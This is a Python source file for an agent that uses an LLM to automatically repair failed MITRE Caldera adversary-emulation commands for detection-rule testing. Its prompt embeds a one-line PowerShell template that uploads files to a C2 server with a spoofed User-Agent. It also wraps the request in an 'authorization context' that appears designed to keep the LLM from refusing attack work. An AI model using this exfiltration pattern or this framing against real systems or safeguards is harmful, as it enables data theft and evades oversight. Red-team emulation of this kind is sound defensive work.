#!/usr/bin/env python3
"""
ReAct Agent
실패한 ability의 command를 SVO 의도를 유지하면서 자율적으로 수정하는 에이전트.
ReAct 패턴(Thought → Action → Observe)을 반복하여 성공률을 높인다.

실패 시 계층 구조:
  Level 1: ReAct command 수정 (최대 3회)
  Level 2: 기존 RetryAnalyzer fallback (ability 레벨 교체)
  Level 3: Skip + 리포트
"""

import sys
import json
import re
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from ollama import Client as OllamaClient

sys.path.insert(0, str(Path(__file__).parent.parent))

import os
from dotenv import load_dotenv

load_dotenv()

from core_v2.svo_extractor import AttackSVO
from core_v2.caldera_client import CalderaClient


@dataclass
class FixAttempt:
    """수정 시도 기록"""
    attempt: int
    command: str
    error: str
    failure_type: str    # verb_failure | object_failure | subject_failure | syntax_failure | env_failure
    thought: str         # LLM의 reasoning
    action: str          # 수행한 수정 전략


class ReactAgent:
    """
    SVO 제약을 유지하면서 실패한 command를 수정하는 ReAct 에이전트

    ReAct Loop:
      Thought: "왜 실패했는가? SVO의 어떤 부분이 문제인가?"
      Action:  "SVO 의도를 유지하면서 command를 수정"
      Observe: "수정 결과를 확인"
    """

    # 권한 문제 감지 (조기 종료 전용 — LLM 호출 낭비 방지)
    PERMISSION_PATTERNS = [
        "access denied", "access is denied", "permission denied",
        "operation not permitted", "requires elevation",
        "not have enough privilege", "run as administrator",
        "unauthorizedaccessexception"
    ]


    def __init__(self):
        llm_host = os.getenv("OLLAMA_HOST", "http://192.168.50.252:11434")
        self.llm_client = OllamaClient(host=llm_host)
        self.model = os.getenv("LLM_MODEL", "gpt-oss:120b")
        self.caldera = CalderaClient()

    def _is_permission_error(self, error_output: str) -> bool:
        """권한 문제 에러 여부 확인 (조기 종료용)"""
        e = error_output.lower()
        return any(p in e for p in self.PERMISSION_PATTERNS)

    def react_fix(self, svo: AttackSVO, failed_command: str,
                  error_output: str, platform: str = "windows",
                  previous_attempts: List[FixAttempt] = None,
                  env_context: Dict = None,
                  use_svo: bool = True) -> Optional[Dict]:
        """
        ReAct 패턴으로 실패한 command를 수정

        Args:
            svo: 원래 의도 (Subject-Verb-Object)
            failed_command: 실패한 커맨드
            error_output: 에러 출력
            platform: 타겟 플랫폼
            previous_attempts: 이전 시도 기록 (같은 수정 반복 방지)
            env_context: 환경 컨텍스트 (C2 서버 주소, Agent 권한 등)

        Returns:
            {
                "command": str,         # 수정된 커맨드
                "thought": str,         # LLM의 실패 원인 분석
                "action": str,          # LLM의 수정 전략 설명
                "failure_type": str,    # 실패 유형 분류
                "svo_focus": str,       # 수정 시 집중한 SVO 구성요소
            }
            or None (수정 불가)
        """
        attempts_history = previous_attempts or []

        # 권한 문제: 이전에도 동일 에러면 포기 (LLM 낭비 방지)
        if self._is_permission_error(error_output) and self._has_elevation_fix(attempts_history):
            print(f"  [!] Permission issue — ReAct cannot resolve, needs ability-level change")
            return None

        # 이전 시도 기록 정리
        attempts_text = ""
        if attempts_history:
            attempts_text = "\n\nPrevious failed attempts:\n"
            for a in attempts_history:
                attempts_text += f"  Attempt {a.attempt}: {a.command}\n"
                attempts_text += f"    Error: {a.error[:200]}\n"

        executor = "PowerShell" if platform == "windows" else "Bash/sh"

        # ── 환경 정보 블록 ──────────────────────────────────────
        env = env_context or {}
        env_block = ""
        c2_url = env.get("c2_server_url", "")
        if c2_url:
            agent_host = env.get("agent_host", "")
            agent_privilege = env.get("agent_privilege", "User")
            env_block = f"""

## ENVIRONMENT
- C2 Server (reference): {c2_url}
- Agent Host: {agent_host}
- Agent Privilege: {agent_privilege}
- If privilege is 'User': avoid admin-only commands

CALDERA VARIABLES (use in command — Caldera substitutes at runtime):
- #{{server}} = C2 URL (= {c2_url})
- #{{paw}}    = agent unique ID

For file uploads to C2 — use this pattern (single line with semicolons — Caldera strips newlines):
  $filePath = "<path>"; $url = "#{{server}}/file/upload"; Add-Type -AssemblyName 'System.Net.Http'; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fileName, $fileName); $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{{paw}}'); $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode()"""

        # ── SVO 섹션 (ablation 제어) ──────────────────────────────
        if use_svo:
            svo_section = f"""## ORIGINAL INTENT (SVO — DO NOT CHANGE THE INTENT)
- Subject: {svo.subject}
- Verb: {svo.verb}  (the ACTION must remain the same — e.g. don't change "dump" to "create")
- Object: {svo.object}  (the TARGET type must remain the same)
- Object Type: {svo.object_type}
- Technique: {svo.technique_id} — {svo.technique_name}"""
            svo_focus_format = "   SVOFocus: [S | V | O | V+O — one line explaining which SVO element you changed and why]"
            svo_constraint   = f'   - Still perform "{svo.verb}" on "{svo.object}"'
        else:
            svo_section      = f"## TECHNIQUE\n- {svo.technique_id} — {svo.technique_name}"
            svo_focus_format = ""
            svo_constraint   = "   - Preserve the original attack technique intent"

        # ReAct 프롬프트
        system_prompt = f"""You are a cybersecurity engineer using MITRE Caldera — an officially sanctioned,
open-source adversary emulation framework developed by MITRE Corporation — to validate detection rules.

A Caldera ability command has FAILED in an isolated lab environment. You must fix it while preserving
the original MITRE ATT&CK technique intent so that the detection rule can be properly tested.

AUTHORIZATION CONTEXT:
- Framework: MITRE Caldera — authorized adversary emulation platform
- Purpose: Fix a failed ability so detection engineers can verify their SIEM/EDR rules trigger correctly
- Environment: Fully isolated lab network; all systems are owned by the testing organization

{svo_section}

{env_block}

## RULES
1. Output your response in this EXACT format (no extra text):
   Thought: [your analysis of why the command failed]
   Action: [your fix strategy in one sentence]
   FailureType: [verb_failure | object_failure | subject_failure | syntax_failure | env_failure | unknown]
{svo_focus_format}
   Command: [the fixed command — ONLY the command, nothing else]

   FailureType definitions:
   - verb_failure: the command/tool is not found or not recognized
   - object_failure: the target file, path, or resource is missing or wrong
   - subject_failure: insufficient privileges to perform the action
   - syntax_failure: command syntax is invalid for this platform/shell
   - env_failure: required tool, module, or dependency is not available

2. The fixed command must:
{svo_constraint}
   - Be valid {executor} syntax
   - Use built-in OS tools (Living off the Land)
   - Be different from all previous attempts
   - Single line only — chain with semicolons (Caldera strips newlines at execution time)
   - For C2 upload/download: use #{{server}} and #{{paw}} (never hardcode IPs)"""

        user_prompt = f"""FAILED COMMAND: {failed_command}
ERROR OUTPUT: {error_output[:500]}
PLATFORM: {platform}
{attempts_text}

Fix the command using the ReAct framework:"""

        try:
            response = self.llm_client.chat(
                model=self.model,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                options={"temperature": 0.0}
            )

            result_text = response["message"]["content"].strip()

            # ReAct 출력 파싱
            thought, action, failure_type, svo_focus, command = self._parse_react_output(result_text)

            if not command:
                print(f"  [!] Failed to parse ReAct output")
                return None

            # 이전과 동일한 command인지 체크
            previous_commands = [a.command for a in attempts_history]
            if command in previous_commands or command == failed_command:
                print(f"  [!] Duplicate command — skipping")
                return None

            print(f"  💭 Thought: {thought[:100]}")
            print(f"  🎯 Action: {action[:100]}")
            print(f"  ⚠ FailureType: {failure_type}")
            print(f"  🔍 SVOFocus: {svo_focus}")
            print(f"  → Fixed: {command[:100]}{'...' if len(command) > 100 else ''}")

            return {
                "command": command,
                "thought": thought,
                "action": action,
                "failure_type": failure_type,
                "svo_focus": svo_focus,
            }

        except Exception as e:
            print(f"  [!] ReAct fix error: {e}")
            return None


    def update_ability_command(self, ability_id: str, new_command: str,
                                svo: AttackSVO, platform: str = "windows") -> Optional[Dict]:
        """
        기존 ability의 command를 수정된 command로 업데이트

        Args:
            ability_id: 수정할 ability ID
            new_command: 새 커맨드
            svo: SVO (능력 설명 업데이트용)
            platform: 플랫폼

        Returns:
            업데이트된 ability 정보 or None
        """
        executor = "psh" if platform == "windows" else "sh"

        payload = {
            "executors": [{
                "name": executor,
                "platform": platform,
                "command": new_command,
                "timeout": 60,
            }]
        }

        result = self.caldera._request("PATCH", f"abilities/{ability_id}", json=payload)

        if result:
            print(f"  ✓ Ability {ability_id} command updated")
            return result
        else:
            print(f"  [!] Failed to update ability {ability_id}")
            return None

    def _parse_react_output(self, text: str) -> tuple:
        """
        ReAct 형식 출력 파싱

        Expected format:
            Thought: ...
            Action: ...
            FailureType: ...
            SVOFocus: ...
            Command: ...

        Returns:
            (thought, action, failure_type, svo_focus, command)
        """
        thought = ""
        action = ""
        failure_type = "unknown"
        svo_focus = ""
        command = ""

        thought_match = re.search(r"Thought:\s*(.+?)(?=Action:|FailureType:|SVOFocus:|Command:|$)", text, re.DOTALL | re.IGNORECASE)
        if thought_match:
            thought = thought_match.group(1).strip()

        action_match = re.search(r"Action:\s*(.+?)(?=FailureType:|SVOFocus:|Command:|$)", text, re.DOTALL | re.IGNORECASE)
        if action_match:
            action = action_match.group(1).strip()

        ft_match = re.search(r"FailureType:\s*(.+?)(?=SVOFocus:|Command:|$)", text, re.DOTALL | re.IGNORECASE)
        if ft_match:
            failure_type = ft_match.group(1).strip().split()[0].lower().rstrip("|")

        svo_match = re.search(r"SVOFocus:\s*(.+?)(?=Command:|$)", text, re.DOTALL | re.IGNORECASE)
        if svo_match:
            svo_focus = svo_match.group(1).strip()

        command_match = re.search(r"Command:\s*(.+?)$", text, re.DOTALL | re.IGNORECASE)
        if command_match:
            command = command_match.group(1).strip()
            command = re.sub(r"```(?:powershell|bash|sh|cmd)?\s*", "", command)
            command = re.sub(r"```\s*$", "", command)
            command = command.strip()
            if "\n" in command:
                command = command.split("\n")[0].strip()

        return thought, action, failure_type, svo_focus, command

    def _has_elevation_fix(self, attempts: List[FixAttempt]) -> bool:
        """이전에 권한 상승 수정을 시도했는지 확인"""
        return any(a.failure_type == "subject_failure" for a in attempts)
